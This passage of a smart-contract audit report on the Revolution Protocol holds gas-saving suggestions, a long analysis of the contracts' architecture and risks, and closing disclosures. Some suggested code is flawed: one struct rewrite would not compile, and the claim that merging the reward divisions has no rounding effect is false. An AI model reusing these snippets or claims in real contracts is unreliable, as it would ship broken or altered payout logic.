50:             (paymentAmountWei * DEPLOYER_REWARD_BPS) /
51:             10_000 +
52:             (paymentAmountWei * REVOLUTION_REWARD_BPS) /
53:             10_000;
54:     }
55: 
56:     function computePurchaseRewards(uint256 paymentAmountWei) public pure returns (RewardsSettings memory, uint256) {
57:         return (
58:             RewardsSettings({
59:                 builderReferralReward: (paymentAmountWei * BUILDER_REWARD_BPS) / 10_000,
60:                 purchaseReferralReward: (paymentAmountWei * PURCHASE_REFERRAL_BPS) / 10_000,
61:                 deployerReward: (paymentAmountWei * DEPLOYER_REWARD_BPS) / 10_000,
62:                 revolutionReward: (paymentAmountWei * REVOLUTION_REWARD_BPS) / 10_000
63:             }),
64:             computeTotalReward(paymentAmountWei)
65:         );
66:     }
```
Use this:

```solidity
File: RewardSplits.sol
41:     function computeTotalPurchaseRewards(uint256 paymentAmountWei) public pure returns (RewardsSettings memory, uint256) {
42:         if (paymentAmountWei <= minPurchaseAmount || paymentAmountWei >= maxPurchaseAmount) revert INVALID_ETH_AMOUNT();
43:         
44:         uint256 br = (paymentAmountWei * BUILDER_REWARD_BPS) / 10_000;
45:         uint256 pr = (paymentAmountWei * PURCHASE_REFERRAL_BPS) / 10_000;
46:         uint256 dr = (paymentAmountWei * DEPLOYER_REWARD_BPS) / 10_000;
47:         uint256 rr = (paymentAmountWei * REVOLUTION_REWARD_BPS) / 10_000;
48:
49:         return (
50:             RewardsSettings({
51:                 br,
52:                 pr,
53:                 dr,
54:                 rr
55:             }),
56:             br + pr + dr + rr
57:         );
58:     }
```

## [G-18] Calculation in computeTotalReward() can be simplified to save gas

Currently the calculation is very repetitive as seen below and some similar operations occur internally. If we observe closely, each reward separated by `+` have paymentAmountWei and 10000 common in them.

Let us assume x = paymentAmountWei, y = 10000 and a,b,c,d = each of the reward bps types respectively.

Current equation = `(x * a)/y + (x * b)/y + (x * c)/y + (x * d)/y`

Let's take x / y common,

Modified Equation = `x/y * a + x/y * b + x/y * c + x/y * d`

Further let's take x/y common from all terms,

Modified Equation = `x/y * (a + b + c + d)`

Now since we need to get rid of the rounding, we just multiply first instead of divide.

**Final Equation** = `(x * (a + b + c + d)) / y`

This final equation will save us alot of gas without compromising on any rounding issues.

Instead of this:

```solidity
File: RewardSplits.sol
41:     function computeTotalReward(uint256 paymentAmountWei) public pure returns (uint256) {
42:         if (paymentAmountWei <= minPurchaseAmount || paymentAmountWei >= maxPurchaseAmount) revert INVALID_ETH_AMOUNT();
43: 
44:         
45:         return
46:             (paymentAmountWei * BUILDER_REWARD_BPS) /
47:             10_000 +
48:             (paymentAmountWei * PURCHASE_REFERRAL_BPS) /
49:             10_000 +
50:             (paymentAmountWei * DEPLOYER_REWARD_BPS) /
51:             10_000 +
52:             (paymentAmountWei * REVOLUTION_REWARD_BPS) /
53:             10_000;
54:     }
```
Use this:

```solidity
File: RewardSplits.sol
41:     function computeTotalReward(uint256 paymentAmountWei) public pure returns (uint256) {
42:         if (paymentAmountWei <= minPurchaseAmount || paymentAmountWei >= maxPurchaseAmount) revert INVALID_ETH_AMOUNT();
43: 
44:         
45:         return
46:             (paymentAmountWei * (BUILDER_REWARD_BPS + PURCHASE_REFERRAL_BPS + DEPLOYER_REWARD_BPS + REVOLUTION_REWARD_BPS)) / 10_000;
47:     }
```

## [G-19] Negating twice in require check is not required in `_vote()` function

The require check below can just use == instead of negating twice to ensure voter has already voted or not.

Instead of this:

```solidity
File: CultureIndex.sol
315:         require(!(votes[pieceId][voter].voterAddress != address(0)), "Already voted");
```
Use this:

```solidity
File: CultureIndex.sol
315:         require(votes[pieceId][voter].voterAddress == address(0), "Already voted");
```

**[rocketman-21 (Revolution) confirmed](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/322#issuecomment-1877726027)**

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/322#issuecomment-1880065190):**
 > Selected for report due to providing value from a high-level contract/function point of view.

***

# Audit Analysis

For this audit, 13 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/51) by **pavankv** received the top score from the judge.

*The following wardens also submitted reports: [ihtishamsudo](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/712), [hunter\_w3b](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/691), [Sathish9098](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/673), [ZanyBonzy](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/653), [wahedtalash77](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/642), [unique](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/615), [Raihan](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/596), [peanuts](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/578), [albahaca](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/564), [kaveyjoe](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/556), [0xAsen](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/474), and [ABAIKUNANBAEV](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/228).*

### Table of Contents

| Sl.no  | Particulars  |
|---|---|
| 1   | Overview  |
| 2  | Architecture view(Diagram)  |
| 3  | Approach taken in evaluating the codebase  |
| 4  | Centralization risks  |
| 5  | Mechanism review  |
| 6  | Recommendation   |
| 7  | Hours spent  |


### 1. Overview

Revolution protocol aims to make governance token ownership more accessible by offering smaller denominations and alternative acquisition methods. This empowers creators and builders with a voice in shaping the project's future without needing to invest large sums. Revolution protocol have a set of smart contracts built upon the foundation of Nouns DAO, aiming to address some perceived limitations and create a more accessible and balanced ecosystem for creators and builders. It goes beyond simply buying tokens. It explores alternative acquisition methods, such as contributing skills, completing tasks, or participating in community activities. This opens the door for creators and builders to earn governance rights through their valuable contributions, democratizing the power structure and ensuring a more diverse and engaged community. Instead of relying solely on expensive, whole tokens, it introduces smaller, more accessible denominations. This allows individuals to participate in governance and decision-making with a lower financial barrier. Imagine being able to buy a "fraction" of a governance token, granting you a proportionate voice in shaping the project's future.

### 2.  Architecture view (Diagram)

![FlowChart](https://user-images.githubusercontent.com/69415766/291059531-928c202c-5cd3-4b5e-b6a3-27715f082e49.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTEiLCJleHAiOjE3MDI4MjEzODAsIm5iZiI6MTcwMjgyMTA4MCwicGF0aCI6Ii82OTQxNTc2Ni8yOTEwNTk1MzEtOTI4YzIwMmMtNWNkMy00YjVlLWI2YTMtMjc3MTVmMDgyZTQ5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFJV05KWUFYNENTVkVINTNBJTJGMjAyMzEyMTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjMxMjE3VDEzNTEyMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTgwN2Q5ZGM2NmM5MjZiYWUwODEwMjRhOTdhNzEyMzEyZmFkMjFjMmI2MGQ0ZTlkNDk1MWJjNGE0ZjhmOWE4MTgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.LalANz0sZlxIyzjJm-K8DYUcnoh_Uq10UhNpHafOSpg)

Please visit [link](http://icp-tool.rf.gd/Revolution.png) to full view of diagram.

### 3. Approach taken in evaluating the codebase 
We approached manual code review by looking into each space in the scoped contract and decided to explain some core functional contracts.it is important to note that manual code reviews can be very time-consuming.

The main contracts are:
1. MaxHeap.sol
2. CultureIndex.sol
3. VerbsToken.sol
4. AuctionHouse.sol
5. VRGDAC.sol
6. ERC20TokenEmitter.sol
7. Rewards.sol

**1. MaxHeap.sol**<br>
This contract plays vital role in Revolution Protocol by implementation of Heap and Max Heap data structure and it functionalites in placing the top voted art piece in parent node and less voted art piece as the child node of the root node (parent node). This eliminates the traditional voting system and effecient in nature also. The MaxHeap contract represents a significant leap forward in voting system design within the Revolution Protocol. Its innovative application of data structures not only streamlines the voting process but also fosters a more dynamic, efficient, and transparent experience for all participants.

State variables are:
- `address admin` to stores the admin adress.
- `heap` mapping to store the structure of the heap
- `uint256 size` to stores the size of the heap.
- `valueMapping` mapping to store value of an item in the heap.
- `positionMapping` mapping to store the position of the item in the heap.

Core functions are:

`parent()`<br>
This function, calculates the index of the parent node for a given position in a Max Heap data structure. The pos - 1 part accounts for the indexing starting from 0, while the / 2 part performs the floor division to find the parent index based on the binary tree structure of a Max Heap. In a Max Heap, the left child of a node is at 2pos + 1 and the right child is at `2pos + 2`, so the parent is located at floor((pos - 1) / 2).

`swap()`<br>
This function efficiently swaps two elements in a heap and updates the corresponding position mapping to ensure accurate tracking of element locations.

`maxHeapify()`<br>
This function, maxHeapify, maintains the max-heap property of a data structure called a "heap". It takes a starting position, pos, and ensures that the element at that position has a value greater than or equal to its child node. It finds the positions of the left and right child node of the element at `pos`. Then it retrieves the values of the element at pos and its child node using a mapping, `valueMapping`, which links heap positions to their actual value and avoids unnecessary processing if the element is already in the lower half of the heap finally if the element's value is less than either child's value, it needs to be heapified if the left child node has a greater value than the right, the element is swapped with the left child node and `maxHeapify` is called again on the left child's new position.Otherwise, the element is swapped with the right child and maxHeapify is called on the right child node's new position.

`insert()`<br>
This function takes two arguments: an item ID and its value. It inserts the item ID into the heap mapping and updates the corresponding value and position mappings. The function then walks up the heap, swapping the item with its parent if the parent's value is less than the child's. This process continues until the inserted item reaches its appropriate position in the heap, maintaining the heap property where each parent's value is greater than or equal to its child node's values. Finally, the function increments the heap size to reflect the new item.

`updateValue()`<br>
This function updates the value of an existing item in the heap while maintaining its max-heap property. It takes the two argmuents: item ID and its new value as inputs. First, it finds the item's position and its original value in the mappings `postionMapping` and `valueMapping`. Then, it updates the value in the mapping. Based on whether the new value is greater or smaller than the old one, it performs either upwards or downwards heapify. If the new value is larger, it iteratively swaps the item with its parent until it reaches its rightful position in the heap, ensuring parent values remain greater than child values. If the new value is smaller, it directly calls the `maxHeapify()` function to adjust the heap downwards, again upholding the max-heap property. This function essentially ensures the heap remains properly structured after updating an item's value.

**2. CultureIndex.sol**<br>
This smart contract is a platform where creators and artists can add new art pieces. These pieces can then be voted on and auctioned by holders of non-transferable ERC-20 voting tokens. This contract plays a vital role in facilitating economic activities for the Revolution protocol. Which is intialised by AuctionHouse contract.

Core function are:

`createPiece()`<br>
This function is responsible for creating new art pieces in the CultureIndex contract. It takes two arguments: ArtPieceMetadata containing details about the artwork and CreatorBps specifying the percentage distribution of token voting power among creators.First, it performs a series of validations on both arguments to ensure they comply with specified rules. Then, it initializes a new ArtPiece variable (newPiece) and assigns values from the provided arguments and internal calculations.

`vote()`<br>
This function functions as an interface for holders of non-transferable ERC-20 tokens to vote for art pieces and access information about top and least-voted pieces. It performs extensive validation on the provided arguments to ensure data integrity.To cast a vote, the function retrieves the voter's weight via the getPastVotes() function. It then updates the piece's vote count and the total weighted votes, reflecting the new vote. Finally, it calls the updateValue() function to adjust the piece's position within the internal heap data structure based on its updated vote count.

`dropTopVotedPiece()`<br>
This function is used to pulls the top voted Art piece in-order to auction-off. First it checks whether the `msg.sender` is `dropperAdmin` or not then calls `getTopVotedPiece()` function to get the piece information and checks the whether the piece quorum values meets or not finally assigns `isDropped` bool value to true it means it cannot be called again. And calls
`extractMax()` fucntion to reduce the heap structure.

**3. VerbsTokens.sol**<br>
VerbsTokens play a crucial role in creating new auctions within the Revolution Protocol. Each auction is backed by a minted ERC-721 token representing the top-voted art piece that has been simultaneously dropped from the CultureIndex contract.

`mintTo()`<br>
This function, likely called by the AuctionHouse contract when creating a new auction, mints a new ERC-721 token based on a verbId. It performs several validations on the input arguments before attempting to `dropTopVotedPiece` from the CultureIndex contract. This function returns the verbId if successful, but fails with an error message if the dropping process fails. But in this try and catch blocks it copy the ArtPiece to memory which is not used anywhere in through out life cycle. Which will cost execution gas.

**4. AuctionHouse.sol**<br>
This contract, AuctionHouse.sol, plays a critical role in the Revolution Protocol by acting as the central hub for managing art piece auctions. It facilitates the creation of new auctions for top-voted art pieces from the CultureIndex. This involves minting corresponding ERC-721 tokens as representations of the auctioned pieces.Users can interact with existing auctions by placing. The contract tracks all bids, ensuring fair competition and transparent bidding history.Once an auction concludes, the contract determines the winning bid and facilitates the transfer of ownership of the associated art piece (represented by the ERC-721 token) to the winner. It also distributes rewards and fees in accordance with the predefined auction parameters.

Core functionalities are:

`createBid()`<br>
This function allows users to place bids on existing auctions with amounts exceeding the current highest bid. It implements a multi-step validation process to ensure data integrity and fair bidding practices. Firstly, it verifies that the provided arguments adhere to specified rules. Then, it checks if the sender's bid `msg.value` is greater than the current highest bid. If so, it updates the auction's highest bidder to the sender `msg.sender`. Additionally, if the time remaining in the auction is less than a predefined 'timeBuffer', the function automatically extends the auction duration to prevent last-minute sniping attempts. Finally, it refunds the previously highest bidder their deposited amount.

`_createAuction()`<br>
This function facilitates the creation of a new auction following the conclusion of the previous one. Initially, it performs a crucial gas check to ensure sufficient resources for subsequent operations.If sufficient gas is available, the function calls the mint() function of the VerbsToken contract to mint a new ERC-721 token representing the next art piece up for auction. Finally, it assigns a specific value to the newly minted token based on pre-defined rules or factors related to the art piece's characteristics or the platform's economic model.

`_settleAuction()`<br>
Sure, here is a summary of the function in a paragraph:<br>
This function is called internally to settle an auction after it has ended. It first checks to make sure that the auction has not already been settled and that the current time is past the end time of the auction. If all of the checks are passed, the function sets the settled variable of the auction to true to indicate that it has been settled.Next, the function checks to see if the contract has enough money to cover the reserve price of the auction. If it does not, then the function refunds the last bidder and burns the verb. Otherwise, the function checks to see if anyone bid on the auction. If no one bid, then the function burns the Verb. If someone did bid, then the function transfers the Verb to the winning bidder.The function then calculates how much money should go to the owner of the auction, the creators of the verb, and the treasury. The amount of value is then transferred to the appropriate addresses.Finally, the function emits an AuctionSettled event to let everyone know that the auction has been settled.

**5. VRGDAC.sol**<br>
This contract plays vital role in revolution protocol by implementing the continuous variable rate gradual dutch auction (VRGDA) mechanism for selling tokens.It aims to mimic a pre-defined issuance schedule for token distribution, adjusting the price dynamically based on time and the number of tokens sold. It helps to determine how much the price decreases with each unit of time without any sales.The price declines gradually over time, following an exponential decay curve. This contract facilitates the controlled sale of tokens according to a predetermined schedule, adjusting the price to incentivize purchase while ensuring gradual distribution and preventing rapid dumping. This mechanism helps regulate token supply and market stability within the Revolution Protocol ecosystem.

Core function are:

`pIntegral()`<br>
This pIntegral function in the VRGDAC contract calculates the total amount of amount would be pay for a specific number of tokens `sold` based on the current time `timeSinceStart` and the total number of tokens already sold. It essentially integrates the price curve of the VRGDA over the specified amount of sold tokens.

`xToy()`<br>
This function calculates the amount of amount need to pay `y` to purchase a specific number of tokens `amount` in the VRGDAC at a given point in time.

`yToX()`<br>
This function performs the inverse calculation compared to xToY().It determines how many tokens  can get `x` for a given amount of money `y` at a specific point in time.It performs a complex calculation involving exponents, logarithms, and multiplication to determine the number of tokens corresponding to the provided amount. This calculation essentially inverts the price curve from `pIntegral()` and takes into account the current time, remaining supply, target price, price decay, and the provided amount.

**6. ERC20TokenEmitter.sol**<br>
This contract plays a crucial role in the Revolution Protocol by enabling the continuous linear purchase of its ERC20 governance token. It allows anyone can purchase the ERC20 token at any time with a predictable price curve.Tokens backed by this contract ar non-transferable erc20 tokens called as governance tokens which will be needed to voting an art piece.

Core function are:

`buyToken()`<br>
This function allows users to purchase tokens for themselves and other addresses. The purchase amount is split based on percentages specified in basisPointSplits. A portion of the amount goes to the protocol rewards, treasury, and creators, while the rest is used to mint tokens (non-transferable erc20 tokens) for the buyers and creators. The function ensures that everyone involved receives their fair share and keeps track of the total tokens emitted.

**7. RewardSplits**<br>
This is an abstract contract that implements a mechanism for calculating how rewards should be split between builders and creators, both during the purchase of governance tokens and after the settlement of an auction.

core functions are:

`computeTotalReward()`<br>
this function calculates the total rewards distributed during a token purchase. It takes the purchase amount  as input and verifies it falls within the allowed range. Then, it applies pre-defined percentages `basis points` to the amount to determine individual reward shares for builders, purchase referral source, deployer, and the revolution itself.

`_depositPurchaseRewards()`<br>
This function used to determines rewards earned during a token purchase first calls computePurchaseRewards to determine the total reward amount and individual reward shares for different stakeholders based on predefined percentages.If any of the provided referral or deployer addresses are empty, it sets them to a designated `revolution reward recipient` address.Finally, it calls the `protocolRewards.depositRewards()` function to deposit the calculated rewards to the corresponding  builder, purchase referral, deployer, and the revolution itself. Each recipient receives their designated share as specified in the RewardsSettings structure.

`computePurchaseRewards()`<br>
This function calculates and packages reward details for a token purchase by calculating individual reward shares for builder referral, purchase referral, deployer, and revolution by applying pre-defined percentages `basis points` to the purchase amount. These are stored in a RewardsSettings structure.

### 4. Centralization risks

The function listed below have `onlyOwner()` modifier will landed on risk if owner address compromised by various factors.
- [`setCreatorRateBps()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L217)
- [`setMinCreatorRateBps()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L233)
- [`setEntropyRateBps()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L253)
- [`setMinBidIncrementPercentage()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L297)
- [`burn()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/VerbsToken.sol#L184)
- [`setMinter()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/VerbsToken.sol#L209)
- [`lockCultureIndex()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/VerbsToken.sol#L262)

### 5. Mechanism review 

After manual testing, we concluded that a revolution protocol reimagines Nouns protocol's model, empowering creators and builders through affordable governance tokens. It seeks to bridge the chasm between artistic expression and economic value, while guaranteeing the continual expansion of decision-making power within the community. This innovative marketplace serves as a platform for artists to unleash their creative talents, with community members casting their votes to choose the most deserving piece. The artwork garnering the highest vote is then auctioned off, with a portion of the winning bid distributed among the artist, builders, and the auction contract owner. A further share is allocated to the artist in the form of non-transferable voting tokens, granting them a voice in shaping the future of the platform. This unique system empowers creators to not only reap financial rewards but also actively participate in shaping the direction of Revolution DAO.

**Comparision between Revolution Protocol and Nouns DAO**
| Feature  | Revolution DAO  | Nouns DAO  |
|---|---|---|
| Focus  | Empowering creators and builders  | Collective ownership and treasury growth  |
| Governance Tokens  | smaller denominations, alternative acquisition methods  | Single denomination, auction-based acquisition  |
| Treasury Allocation  | Split between creators, builders, and auction contract owner, with portion to creators in non-transferable voting tokens  | 100% to treasury  |
| Decision-making Power  | Continuously expanding through governance token inflation  | Concentrated among early investors and large token holders  |
| Revenue Streams  | Schedueled auctions, alternative initiatives  | Daily auctions  |
| Benefits for Creators  | Direct funding through grants and dedicated treasury allocation, non-transferable voting tokens for influence  | Indirect benefit through potential treasury use  |
| Accessibility  | More accessible governance participation for creators and builders  | More accessible governance participation for creators and builders  |
| Long-term Sustainability  | Focus on diverse revenue streams and inflation-based governance growth  | Reliance on daily auction revenue  |
| Overall Vision  | Bridge the gap between artistic expression and economic value, empower creators and builders  |  Decentralized ownership, collective decision-making, treasury growth |

### 6. Recommendation

After manual observation of code and mechanism we recommend a simple changes which make more robustness to revolution protocol:

1. Add function mechanism to set the dropper admin.<br>
Implement a function to designate the Dropper Admin . This is crucial because the current Dropper Admin being the Verbs Token Contract poses a risk. If the Verbs Token Contract were compromised, it could be upgraded independently, potentially jeopardizing the top-voted piece and causing losses for creators. By adding a mechanism to change the Dropper address, even in the event of a compromise, we can safeguard the top-voted piece. Alternatively, we could implement a pause and unpause functionality, by implementing the below code snippet allowing the top piece to be auctioned even if the Verbs Token Contract is compromised.

```solidity
function setDropperAdmin(address newDropper) onlyManager {
	dropperAdmin = newDropper;
}
```

2. Add the pause and unpause mechanism for some crucial functions also which would be helpfull in the time of any financial risk or security risks.- 
Below can be adopt the mechanism:
- [`Vote()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/CultureIndex.sol#L332)
- [`dropTopVotedPiece()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/CultureIndex.sol#L519)
- [`createPiece()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/CultureIndex.sol#L209)
- [`createBid()`](https://github.com/code-423n4/2023-12-revolutionprotocol/blob/main/packages/revolution/src/AuctionHouse.sol#L171)

3. There is chance if overflow errors in [`_calculateVoteWeight()`]() function depending on the data types used for erc20Balance and erc721Balance, the multiplication with erc721VotingTokenWeight * 1e18 could potentially overflow and lead to incorrect results. It's essential to choose appropriate data types that can handle the expected range of values.Add some division operation will help to get the precision value.

4. Rounding Down to Zero issue.<br>
We can take look into the below varaibles and function first .

```solidity
    uint256 internal constant DEPLOYER_REWARD_BPS = 25;
    uint256 internal constant REVOLUTION_REWARD_BPS = 75;
    uint256 internal constant BUILDER_REWARD_BPS = 100;
    uint256 internal constant PURCHASE_REFERRAL_BPS = 50;
    uint256 public constant minPurchaseAmount = 0.0000001 ether;
    uint256 public constant maxPurchaseAmount = 50_000 ether;
    
    function computeTotalReward(uint256 paymentAmountWei) public pure returns (uint256) {
        if (paymentAmountWei <= minPurchaseAmount || paymentAmountWei >= maxPurchaseAmount) revert INVALID_ETH_AMOUNT();

        return
            (paymentAmountWei * BUILDER_REWARD_BPS) / 10_000 + (paymentAmountWei * PURCHASE_REFERRAL_BPS) /10_000
             +
            (paymentAmountWei * DEPLOYER_REWARD_BPS) / 10_000 + (paymentAmountWei * REVOLUTION_REWARD_BPS) / 10_000;
    }
    
    
```

The value of `paymentAmountWei` variable of the function argument could be 0.0000001 and more than that makes the return variable as zero only as we know solidity doesn't support decimals point add some check that if the calculated return is less than the minimum, we can set the return value to the minimum instead. This ensures that even small payments contribute to the system.

5. Add mechanism to check the total supply of tokens is greater than zero or minimum amount before calculating vote weight of a voter or cultureIndex contract.

6. Currently, Nouns DAO auctions operate sequentially, with each new auction beginning only after the previous one concludes. Revolution Protocol can proposes new idea to modify this traditional approach by enabling the simultaneous auctioning of multiple verbs. This could be achieved by replacing the singular auction house contract with a data structure like a mapping, associating verbs with their respective auctioning process information.

### 7. Hours spent
45 hours (Gas finding, QA findings, and Analysis report)

**[rocketman-21 (Revolution) acknowledged](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/51#issuecomment-1874775228)**

**[0xTheC0der (Judge) commented](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/51#issuecomment-1880087793):**
 > As always there were multiple great Analysis reports and a combination of them would provide the most value in terms of protocol overview, mechanisms and risks.<br>
> Therefore, I also want to specifically mention reports from three other wardens: [ihtishamsudo](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/712), [hunter\_web3](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/691), and [Sathish9098](https://github.com/code-423n4/2023-12-revolutionprotocol-findings/issues/673).<br>
> Nevertheless, the current report offers a good entry point for newcomers to get to know the protocol while also providing value for the sponsor and was therefore selected for report.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
